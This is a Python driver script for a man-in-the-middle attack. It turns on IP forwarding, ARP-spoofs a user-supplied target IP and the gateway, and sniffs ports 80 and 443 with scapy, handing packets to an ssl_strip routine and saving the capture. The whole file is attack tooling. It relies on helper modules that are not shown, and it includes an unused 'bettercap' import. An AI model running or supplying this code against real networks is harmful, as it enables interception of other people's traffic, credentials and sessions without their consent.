import scapy.all as scapy
from bettercap import run_bettercap
import threading

from networking import *
from arpspoof import *
from sslStripping import *

def main():
    # If necessary, enable ip_forwarding
    enable_ip_forwarding()

    # Arp spoofing setup
    arp_spoofer = ArpSpoofer()
    target_ip = input("Target IP: ")
    gateway_ip = get_default_gateway_ip()

    # Begin capturing and processing/analyzing packets
    target_filter = "tcp port 80 or tcp port 443"
    capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip, filter=target_filter)
    capture_device.start()

    try:
        # Begin Spoofing on separate thread
        spoof_thread = threading.Thread(target=arp_spoofer.spoof, args=(gateway_ip, target_ip))
        spoof_thread.daemon = True
        spoof_thread.start()

        # Continue... 
        print("Continue...")

        # Wait for the spoofing thread to finish
        spoof_thread.join()

    except KeyboardInterrupt:
        # Restore ARP tables and remove the MITM position
        arp_spoofer.cleanup(gateway_ip, target_ip)

        # End packet capturing
        capture = capture_device.stop()
        writeCapture(capture)

if __name__ == "__main__":
    main()